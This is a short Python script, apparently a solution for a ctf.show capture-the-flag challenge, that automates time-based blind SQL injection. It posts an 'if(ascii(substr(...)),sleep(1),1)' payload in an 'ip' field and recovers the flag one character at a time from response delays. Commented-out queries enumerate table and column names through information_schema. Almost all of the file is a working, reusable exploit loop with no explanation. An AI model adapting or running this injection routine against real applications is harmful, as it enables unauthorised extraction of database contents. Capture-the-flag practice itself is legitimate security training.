# author:yu22x
import requests
import time
import string

str = string.digits + string.ascii_lowercase + "{-}"
url = 'http://069c6d8e-5a0d-4356-80a1-91647b00f41f.challenge.ctf.show/api/'
flag = ''

for i in range(1, 46):
    # print(i)
    for j in range(32, 126):
        # 表名
        # payload = 'select group_concat(table_name) from information_schema.tables where table_schema=database()'
        # 列名
        # payload = 'select group_concat(column_name) from information_schema.columns where table_name="ctfshow_flagx"'
        # 值
        payload = 'select group_concat(flaga) from ctfshow_flagx'
        data = {
            'ip': f"if(ascii(substr(({payload}), {i}, 1))={j},sleep(1), 1)",
            'debug': 0
        }
        # print(data)
        stime = time.time()
        # print(url + payload)
        r = requests.post(url, data=data)
        etime = time.time()
        if etime - stime >= 1:
            flag += chr(j)
            print(flag)
            break
